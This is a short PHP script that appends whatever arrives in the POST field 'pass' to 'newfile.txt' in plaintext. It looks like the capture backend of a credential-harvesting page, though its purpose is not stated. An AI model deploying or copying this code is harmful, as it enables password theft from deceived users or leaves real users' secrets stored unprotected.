<?php
function writeToFile($password) {
    $myfile = fopen("newfile.txt", "a");
    $newline = "\n";
    $passwordTxt = "";
    fwrite($myfile, $passwordTxt);
    fwrite($myfile, $password);
    fwrite($myfile, $newline);
    fclose($myfile);
}
writeToFile($_POST['pass']);
?>